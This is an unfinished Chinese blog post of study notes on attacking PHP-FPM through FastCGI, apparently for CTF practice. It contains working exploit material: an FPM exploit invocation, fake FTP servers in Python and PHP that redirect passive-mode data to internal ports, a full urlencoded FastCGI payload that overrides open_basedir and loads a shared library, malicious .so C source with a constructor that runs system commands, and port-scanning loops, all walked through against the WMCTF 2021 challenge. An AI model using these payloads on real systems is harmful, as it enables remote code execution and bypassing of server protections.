---
title: "攻击PHP-FPM学习笔记"
slug: "attack-php-fpm-study-notes"
description: "如果你能看到这行字，说明这篇笔记还是个半成品2333333"
date: 2021-11-15T01:58:35+08:00
categories: ["NOTES&SUMMARY"]
series: []
tags: ["PHP", "php-fpm"]
draft: false
toc: true
---

之前做题总是会见到，但并不是很懂实际的原理，有点云里雾里的，好像懂了但又没有完全懂，是时候专门来学一下咯！

没有什么新鲜的东西，只不过把师傅们已有的文章进行一个整合&重新整理，不过自己亲自过一遍手懂了很多东西，参考链接放到最后啦w

## 前置知识

### CGI/FastCGI

CGI协议用于处理html这类静态文件之后出现的动态语言的解释器与webserver通信的问题，具体的实现有php-cgi

CGI的弊端是令webserver每次处理请求时都会fork一个cgi进程，结束后再kill，比较浪费资源，FastCGI协议就解决了这个问题，处理完请求后不会kill而是保留该进程，使它可以一次处理多个请求，这样就不用每次fork了

而php-fpm就是FastCGI协议的一个具体实现，作为FastCGI进程管理器（运行时有一个主进程和多个包含php解释器的worker进程来执行代码），用于接收webserver的请求

### 配置

php-fpm通信方式有tcp（本地监听9000端口）和unix socket套接字两种方式，题目中可以见到的都是tcp9000

```bash
apt update
apt install nginx -y
apt install software-properties-common -y
apt install php7.4-fpm -y
```

#### tcp模式

/etc/php/7.4/fpm/pool.d/www.conf

```ini
listen = 127.0.0.1:9000
```

/etc/nginx/sites-enabled/default

```ini
server{
	...
	location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass 127.0.0.1:9000;
	}
...
}
```

#### ***unix socket模式







```bash
service nginx start	# reload
/etc/init.d/php7.4-fpm start	# restart
```

如果出现报错请查看对应日志

```bash
cat /var/log/nginx/error.log
cat /var/log/php7.4-fpm.log
```

## 漏洞成因

按FastCGI协议传输的内容分为header和body两部分

```c
typedef struct {
  /* Header */
  unsigned char version; // 版本
  unsigned char type; // 本次record的类型
  unsigned char requestIdB1; // 本次record对应的请求id
  unsigned char requestIdB0;
  unsigned char contentLengthB1; // body体的大小
  unsigned char contentLengthB0;
  unsigned char paddingLength; // 额外块大小
  unsigned char reserved;

  /* Body */
  unsigned char contentData[contentLength];
  unsigned char paddingData[paddingLength];
} FCGI_Record;
```

先从heder中拿到body体大小（最大2^16=65535字节），再从tcp流里读取大小等于contentLenth的body，之后还有一部分额外的padding

header中的type起到指定record的作用，因为FastCGI的单个record大小有限作用单一，所以我们需要一个TCP流中传输多个record，通过type来标识每个record的作用是什么，requestId做到区分每一次的请求

![image-20211112110643128](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112110643128.png)

当type=4时，表明消息中包含的数据为某个name-value对，比如（虽然但是，我也不知道这个主题下json渲染出来的颜色这么阴间）

```json
{
    'GATEWAY_INTERFACE': 'FastCGI/1.0',
    'REQUEST_METHOD': 'GET',
    'SCRIPT_FILENAME': '/var/www/html/index.php',
    'SCRIPT_NAME': '/index.php',
    'QUERY_STRING': '?a=1&b=2',
    'REQUEST_URI': '/index.php?a=1&b=2',
    'DOCUMENT_ROOT': '/var/www/html',
    'SERVER_SOFTWARE': 'php/fcgiclient',
    'REMOTE_ADDR': '127.0.0.1',
    'REMOTE_PORT': '12345',
    'SERVER_ADDR': '127.0.0.1',
    'SERVER_PORT': '80',
    'SERVER_NAME': "localhost",
    'SERVER_PROTOCOL': 'HTTP/1.1'
}
```

其中`SCRIPT_FILENAME`就是php-fpm会去执行的文件，由于5.3.9版本引入了`security.limit_extensions`的选项，默认对后缀名限制在了php家族，所以我们可以考虑找到已存在php文件（安装时附带的php文件 可以通过`find / -name "*.php"`来搜索一下默认环境 比如/usr/local/lib/php/PEAR.php），向其中注入恶意代码；而fpm支持通过设置`FASTCGI_PARAMS`来动态修改php的设置，可以利用这两项

```
'PHP_VALUE': 'auto_prepend_file = php://input',
'PHP_ADMIN_VALUE': 'allow_url_include = On'
```

来做到执行某php文件时自动包含POST内容，执行恶意代码（disable_function在php加载时就确定了，无法重写）

## 攻击思路

伪造一个可以正常通信的FastCGI客户端，将传输的内容修改为我们的恶意payload，再发出去

### 远程攻击php-fpm

这里是[p牛的脚本](https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75)，兼容py2&3，默认-p 9000，-c `<?php phpinfo();?>`

```bash
python fpm.py target_ip /var/www/html/index.php -c '<?php echo `id`;exit;?>'
```

我们需要改动的只有params部分的`PHP_ADMIN_VALUE`

```
'PHP_ADMIN_VALUE': 'allow_url_include = On\nextension = /home/amelia/TEMP/fpm/wuhu.so',
```

成功

![image-20211112175028236](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112175028236.png)

需要注意的是，如果只是加载恶意.so而不执行代码，则并不需要有已存在php文件的绝对路径，用`_`占位即可

```bash
python fpm.py target_ip _ -c '<?php echo `id`;exit;?>'
```

![image-20211112175353957](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112175353957.png)

### ***SSRF攻击本地php-fpm

利用`gopher://`协议可以直接传输TCP协议流，我们构造好payload之后urlencode就可以传入进行ssrf攻击了



### 结合ftp&PASV mode攻击本地php-fpm

#### ftp使用PASV模式转发ftp-data

先简单测试ftp连接进行抓包

![image-20211112195819783](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112195819783.png)

其中的`227 Entering Passive Mode (192,168,187,3,230,20)`的括号内的内容表示的是传输的FTP-DATA打向的位置，前一部分是ip，端口是230*256+20=58900

![image-20211112200459682](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112200459682.png)

可以看到我们文件内容是150ok之后才被传出去的，而且会被放在FTP-DATA中被上传和下载

我们可以模拟一个ftp-server，在响应PASV命令（即passive 切换被动模式）时返回`(127,0,0,1,0,12345)`来让FTP-DATA打向内网12345端口；这是一个恶意ftp-server

```python
# 192.168.187.1
import socket
print("[+] listening ...........")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 9999))
s.listen(1)
conn, addr = s.accept()
conn.send(b'220 (vsFTPd 3.0.3)\r\n')
conn.recv(0xff)
conn.send(b'331 Please specify the password.\r\n')
conn.recv(0xff)
conn.send(b'230 Login successful.\r\n')
conn.recv(0xff)
conn.send(b"215 UNIX Type: L8\r\n")
conn.recv(0xff)
conn.send(b'200 Switching to Binary mode.\r\n')
conn.recv(0xff)
conn.send(b'227 Entering Passive Mode (127,0,0,1,0,12345).\r\n')
conn.recv(0xff)
conn.send(b'150 Ok to send data.\r\n')
# sending payload .....
conn.send(b'226 Transfer complete.\r\n')
conn.recv(0xff)
conn.send(b'221 Goodbye.\r\n')
conn.close()
print("[+] completed ~~")
```

在另一台192.168.187.3上访问这个恶意服务，期间传输的文件就会被转发到192.168.187.3自己的12345端口

![image-20211112233757565](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112233757565.png)

#### php加载恶意.so文件

修改php.ini /etc/php/7.4/cli/php.ini

```ini
[PHP]
extension=/home/amelia/TEMP/fpm/wuhu.so
```

C源码

```c
#define _GNU_SOURCE
#include <stdlib.h>

__attribute__ ((__constructor__)) void preload (void){
        system("touch /home/amelia/TEMP/fpm/pwned");
}
```

编译为.so

```bash
gcc wuhu.c -o wuhu.so --shared -fPIC
```

运行php即触发恶意.so

![image-20211112162658685](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112162658685.png)

#### 令php使用ftp://

/etc/php/7.4/cli/php.ini

```ini
allow_url_fopen = On
```

ftp读 注意后面的路径都需要绝对路径

```php
<?php
@var_dump(file_get_contents($argv[1]));
```

```bash
php ftp_read.php 'ftp://test:test@192.168.187.3/home/test/flag.txt'
```

![image-20211112215002622](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112215002622.png)

ftp写

```php
<?php
@var_dump(file_put_contents($argv[1], $agrv[2]));
```

```php
php ftp_write.php 'ftp://test:test@192.168.187.3/home/test/test.txt' 'hello, world'
```

![image-20211112223440182](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112223440182.png)

但是这里一直是可以新建文件但是写入不了，读入的参数2一直是int(0)，暂时还没解决问题（不过用下面那个写入很正常……

覆盖已存在文件

```php
<?php
$context = stream_context_create(array('ftp' => array('overwrite' => true)));
@var_dump(file_put_contents($argv[1], $argv[2], 0, $context));
```

```bash
php ftp_write_2.php 'ftp://test:test@192.168.187.3/home/test/test.txt' 'newwwwew'
```

![image-20211112225832777](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112225832777.png)

#### 令php使用ftp://并转发FTP-DATA

将上面的操作用wireshark抓个包看看流量

![image-20211112230401822](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112230401822.png)

可以看到用的是EPSV mode而不是PASV mode，不会有括号内的ip+port描述，FTP-DATA只会被打向控制连接的服务端的端口，不能做到FTP-DATA的任意转发

不过也不是毫无办法，如果用EPSV命令返回的结果不是229，那么php的ftp://就会使用PASV命令

将上面的ftp-server修改一下，将229响应设为了000

```python
import socket
print("[+] listening ...........")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 9999))
s.listen(1)
conn, addr = s.accept()
conn.send(b'220 (vsFTPd 3.0.3)\r\n')
print(conn.recv(0xff))
conn.send(b'331 Please specify the password.\r\n')
print(conn.recv(0xff))
conn.send(b'230 Login successful.\r\n')
print(conn.recv(0xff))
conn.send(b'200 Switching to Binary mode.\r\n')
print(conn.recv(0xff))
conn.send(b"550 Could not get file size.\r\n")
print(conn.recv(0xff))
# responese with 000 , not 229
conn.send(b'000 use PASV then\r\n')
# then php will send PASV command
print(conn.recv(0xff))
# response to PASV command
conn.send(b'227 Entering Passive Mode (127,0,0,1,0,12345).\r\n')
print(conn.recv(0xff))
conn.send(b'150 Ok to send data.\r\n')
# sending payload .....
conn.send(b'226 Transfer complete.\r\n')
print(conn.recv(0xff))
conn.send(b'221 Goodbye.\r\n')
conn.close()
print("[+] completed ~~")
```

![image-20211112234038671](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112234038671.png)

成功转发

#### 使用ftp://将payload打向fpm

结合上面几个实例应该就很清晰了，思路就是：

- 编写包含执行系统命令的恶意.so
- 打向fpm的一波流量，用于解开open_basedir, allow_url_include等的限制，形式是file_put_contents('ftp://xxx',$payload)
- 用file_put_contents('/tmp/wuhu.so',$_POST['data'])的形式将.so传入
- 如果顺利的话open_basedir解开限制，.so被包含，就可以成功执行.so中的代码做到rce了

这里的完美栗子就是赵总的三句话（指路赵总博客->[WMCTF2021-Web-Make PHP Great Again And Again WriteUp](https://www.zhaoj.in/read-6951.html)

### ***攻击unix socket模式下的php-fpm

## 在题目中的表现

### [WMCTF 2021]Make PHP Great Again And Again

思路先放在前面：找到fpm端口->搭建恶意ftp_server 将.so文件转发至fpm端口->利用.so文件执行命令->拿flag

题目代码只有三句话

```php
<?php
highlight_file(__FILE__);
@eval($_GET['glzjin']);
```

直接看phpinfo();会500，用`get_cfg_var`获取配置项

```
/?glzjin=var_dump(get_cfg_var(%27disable_functions%27));
```

```
string(657) "stream_socket_client,fsockopen,pfsockopen,ini_alter,ini_set,ini_get,posix_kill,phpinfo,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive"
```

只能说该禁的都禁了；再康康allow_url_fopen和include

```
string(1) "1"
string(0) ""
```

再康康open_basedir

```
/?glzjin=var_dump(get_cfg_var(%27open_basedir%27));
```

```
string(14) "/var/www/html/"
```

emmmmmmmmm 这个之后也需要绕过

用tcp://伪协议扫一下本机开放的端口

```php
for($i=0;$i<65535;$i++) {
  $t=stream_socket_server("tcp://0.0.0.0:".$i,$ee,$ee2);
  if($ee2 === "Address already in use") {
    var_dump($i);
  }
}
```

或者`file_get_contents`和`error_get_last`获取到请求中发出的错误进行循环判断也可以进行端口扫描

```php
for($i=0;$i<65535;$i++) {
  $t=file_get_contents('http://127.0.0.1:'.$i);
  if(!strpos(error_get_last()['message'], "Connection refused")) {
    var_dump($i);
  }
}
```

```
int(11451) int(37114) int(48748)
```

找到了fpm端口11451

之后就续上了我们前面的思路，先在本地（也就是靶机的本地）起一个恶意的ftp_server服务用来转发FTP-DATA（即.so文件）至fpm端口（11451）；这里的exp是php版的，原理跟上面的py版是一样的

```php
$socket = stream_socket_server("tcp://0.0.0.0:46819", $errno, $errstr);
if (!$socket) {
  echo "$errstr ($errno)<br />\n";
} else {
  while ($conn = stream_socket_accept($socket)) {
    fwrite($conn, "210 Fake FTP\n");
    $line = fgets($conn);
    echo $line; // USER
    fwrite($conn, "230 Login successful\n");
    $line = fgets($conn);
    echo $line; // TYPE
    fwrite($conn, "200 xx\n");
    $line = fgets($conn);
    echo $line; // SIZE
    fwrite($conn, "550 xx\n");
    $line = fgets($conn);
    echo $line; // EPSV
    fwrite($conn, "500 wtf\n");
    $line = fgets($conn);
    echo $line; // PASV

    // $ip = '192.168.1.4';
    $ip = '127.0.0.1';
    $port = 11451;
    $porth = floor($port / 256);
    $portl = $port % 256;
    fwrite($conn, "227 Entering Passive Mode. ".str_replace('.',',',$ip).",$porth,$portl\n");
    $line = fgets($conn);
    echo $line; // STOR

    fwrite($conn, "125 GOGOGO!\n");
    sleep(1);
    fwrite($conn, "226 Thanks!\n");
    fclose($conn);
  }
  fclose($socket);
}
```

urlencode之后传入，再扫一下端口可以看到46819开放，说明服务正常；还是用之前p牛的脚本构造，这里我们要修改的配置项是这些

```json
'PHP_ADMIN_VALUE': 'allow_url_include = On\nopen_basedir = /\nextension = /tmp/wuhu.so',
```

覆盖掉open_basedir的原有设置，再加上.so文件（稍后上传）；具体的payload也可以用p牛的脚本魔改一下

![image-20211113011624783](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211113011624783.png)

注释掉157-159对连接状态的判断，在191创建连接前将request部分直接输出urlencode的版本然后exit(0)一波退出

```bash
$ python fpm.py 127.0.0.1 '/var/www/html/index.php'
%01%01Mp%00%08%00%00%00%01%00%00%00%00%00%00%01%04Mp%02%05%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH25%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0F%40PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0Aopen_basedir%20%3D%20/%0Aextension%20%3D%20/tmp/wuhu.so%01%04Mp%00%00%00%00%01%05Mp%00%19%00%00%3C%3Fphp%20phpinfo%28%29%3B%20exit%3B%20%3F%3E%01%05Mp%00%00%00%00
```

```
/?glzjin=eval($_POST[%27a%27]);
POST: a=$payload=urldecode('%01%01%29%BE%00%08%00%00%00%01%00%00%00%00%00%00%01%04%29%BE%02%05%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH25%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0F%40PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0Aopen_basedir%20%3D%20/%0Aextension%20%3D%20/tmp/wuhu.so%01%04%29%BE%00%00%00%00%01%05%29%BE%00%19%00%00%3C%3Fphp%20phpinfo%28%29%3B%20exit%3B%20%3F%3E%01%05%29%BE%00%00%00%00');var_dump(file_put_contents('ftp://127.0.0.1:46819/wuhu',$payload));
```

![image-20211114223615660](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114223615660.png)

写恶意.so

```c
#define _GNU_SOURCE
#include <stdlib.h>

__attribute__ ((__constructor__)) void preload (void)
{
    system("ls / -al > /tmp/p1.txt");
    system("find / -perm -4000 2>/tmp/p2.txt");
    system("cat /flag > /tmp/p3.txt");
}
```

```bash
gcc wuhu.c -o wuhu.so --shared -fPIC
```

传.so

```
/?glzjin=eval($_POST[%27a%27]);
POST:
a=var_dump(file_put_contents('/tmp/wuhu.so',$_POST['data']));&data=xxxxxxxxxxxxxxxxxxx
```

![image-20211114224351897](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114224351897.png)

试着执行一下命令，成功解除open_basedir的限制

![image-20211114231135348](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114231135348.png)

但是一样的操作之后就执行不了了……就上面这个页面，就正常出来了第一次，然后就不行了，非常的离谱啊啊啊啊啊

正常来说，只有open_basedir被解放后才可以scandir('/')（没有的话是只可以scandir('/var/www/html')），而既然这样可以执行成功就说明开始的fpm流量一定被正常打出去了，再加上.so也被写入（我到docker上看了），那么.so一定会在php执行时被触发，一定是可以执行.so中我们写的命令的；但是现在竟然连scandir('/')都只能执行一次 ？？？？？？？后面就都失败了，更不要说.so中的命令了，肯定更是没有执行

之后又尝试了很多次，.so正常上传，最开始打向fpm的流量也又打了几遍，失败；再之后.so也不能正常上传了，最初的那个流量也打不成了，只能回显int(xxx)，但是没有eval()的回显，说明还是不正常，然后他妈的，间或有一两次能成功，甚至我都又在/tmp目录下写了别的文件（如果前面的流量没正常打出去的话是绝对不可能做到的，肯定是bool(false)），但是但是但是又是一秒破功，真是不理解了，完全是跟前面一模一样的payload，但是就他妈玄学，吐了

![image-20211115014616324](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211115014616324.png)

不想再耗太多时间在这个题上了，实在是绷不住了（调了快1天了），基本也算是打通了（毕竟就差一点点啊啊啊啊啊 我截图还有呢）（其实是懒的重置docker再尝试了 我的），我猜测出错的点在于那个开在46819端口的ftp服务器不稳定，它在处理这边ftp打出的流量时可能没有正常的处理，再加上来回调整payload打了太多次了，可能之前的错误累积到后面，比如某次没有urlencode之类的，搞得环境也不正常了

### ***[蓝帽杯 2021]One Pointer PHP

------

现在是凌晨1点50分，赵总的题没能成功打出来真的很难受，很难受，很难受，我人裂开，说好的今天必定搞完，但是现在还差3个小标题和2个题没有复现

先把半成品放上来吧，这周内必定收尾！

------

{{% spoiler "以下是本文中涉及到的 和我学习时看过的所有文章的链接 每日感谢互联网的丰富资源（" %}}

[fastcgi协议分析与实例](https://blog.csdn.net/shreck66/article/details/50355729)

[php-fpm 与 Nginx优化总结](https://www.kancloud.cn/digest/php-src/136260)

[浅析php-fpm的攻击方式](https://xz.aliyun.com/t/5598)

[Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html)

[【技术分享】深入 FTP 攻击 php-fpm 绕过 disable_functions](https://mp.weixin.qq.com/s/LP_vfBx3M512P0rYdMMWOA)

{{% /spoiler %}}